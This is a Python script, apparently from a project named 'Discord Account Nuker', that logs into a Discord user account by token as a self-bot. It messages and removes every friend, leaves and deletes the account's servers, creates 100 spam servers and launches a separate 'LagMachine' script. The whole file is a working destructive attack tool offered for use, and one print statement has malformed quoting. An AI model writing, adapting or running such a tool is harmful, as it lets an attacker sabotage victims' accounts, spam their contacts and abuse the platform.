#  /$$$$$$$$                  /$$ /$$          
# |__  $$__/                 | $$| $$          
#   | $$  /$$$$$$   /$$$$$$ | $$| $$ /$$   /$$
#   | $$ /$$__  $$ /$$__  $$| $$| $$| $$  | $$
#   | $$| $$  \__/| $$  \ $$| $$| $$| $$  | $$
#   | $$| $$      | $$  | $$| $$| $$| $$  | $$
#   | $$| $$      |  $$$$$$/| $$| $$|  $$$$$$$
#   |__/|__/       \______/ |__/|__/ \____  $$
#                                   /$$  | $$
#                                   |  $$$$$$/
#                                    \______/ 
#       
#                       Account Nuker By Trollyrique
#           https://github.com/Trollyrique/Discord-Account-Nuker

import subprocess
import config
from config import *
import os
from os import system
import colorama
from colorama import init, Fore, Back, Style
init(convert=True)
import discord
from discord.ext import commands
import requests
os.system('cls && title Account Nuker By Trollyrique' if os.name == 'nt' else 'clear')
import random
client = discord.Client()
with open('icon.png', 'rb') as f:
	icon = f.read()

headers = {'Authorization': TOKEN}

@client.event
async def on_ready():
	input("Press Enter to start destroying account {0.user}" .format(client))
	subprocess.Popen('python LagMachine.py')
	await client.change_presence(activity=discord.Streaming(name="Account Nuker By Trollyrique", url="https://www.twitch.tv/discord"))
	for user in client.user.friends:
	  try:
	    embed=discord.Embed(title="", url="https://github.com/", description="Account Was Destroyed Using Account Nuker By Trollyrique", color=0xff0000)
	    embed.set_author(name="Account Nuker By Trollyrique", url="https://github.com/Trollyrique/Discord-Account-Nuker")
	    await user.dm_channel.send(embed=embed)
	    await user.remove_friend()
	    print(f"Removed {user}")
	  except:
	    pass
	for guild in client.guilds:
	  try:
	    await guild.leave()
	    print(f"Guild left {guild.name}") 
	  except:
	    pass
	  try:
	    await guild.delete()
	    print(f"Guild Delete {guild.name}") 
	  except:
	    pass
	for x in range(100):
	    await client.create_guild(name="Account Nuker By Trollyrique",  icon=icon)
	    print(F"Made Guild {guild}")
	print(Fore.GREEN + "Successfully!")

print(Fore.RED +""
 /$$$$$$$$                  /$$ /$$          
|__  $$__/                 | $$| $$          
   | $$  /$$$$$$   /$$$$$$ | $$| $$ /$$   /$$
   | $$ /$$__  $$ /$$__  $$| $$| $$| $$  | $$
   | $$| $$  \__/| $$  \ $$| $$| $$| $$  | $$
   | $$| $$      | $$  | $$| $$| $$| $$  | $$
   | $$| $$      |  $$$$$$/| $$| $$|  $$$$$$$
   |__/|__/       \______/ |__/|__/ \____  $$
                                    /$$  | $$
                                   |  $$$$$$/
                                    \______/ 
""")
print(Fore.GREEN + "Account Nuker By Trollyrique" + Fore.YELLOW)
print(Fore.RED)

client.run(TOKEN, bot=False)